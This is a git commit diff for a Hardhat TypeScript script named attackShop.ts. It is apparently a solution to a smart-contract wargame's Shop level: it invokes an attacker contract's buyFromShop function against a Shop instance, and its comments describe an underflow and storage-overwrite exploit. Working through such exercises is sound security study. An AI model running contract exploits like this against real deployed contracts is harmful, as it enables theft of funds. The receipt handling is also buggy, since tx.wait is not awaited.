d85cbb8256d89bcbe9d24a9fd64ed18d3f9fcebb
Crys <mariano.christopher123@gmail.com>
2022-11-11 23:56:45 +0800

    updated shop attack

--- scripts/attackShop.ts
+++ scripts/attackShop.ts
@@ -4,15 +4,19 @@ import { ethers } from "hardhat";
 
 const attackShop = async () => {
     // change contract addresses here.
-    const shopAddress = "0xF675Be946818f77Ba00aD069C99C97080800656E";
-    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
+    const _shopAddr /*Shop instance address*/ = "0xF675Be946818f77Ba00aD069C99C97080800656E";
+    const attackShopBuyerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
 
     // Don't touch below
     // Exploit comes from no check for underflow on retract function and changing storage value for owner
     // You may read more on:
-    // https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
-    // https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows
-    // https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there
+    // https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions
+    const ABI = ["function buyFromShop(address _shopAddr)"];
+    const contract = await ethers.getContractAt(ABI, attackShopBuyerAddress);
+    const tx = await contract.buyFromShop(_shopAddr);
+    const txReceipt = tx.wait(1);
+    const Output = txReceipt.toString();
+    console.log(Output);
 };
 
 attackShop()
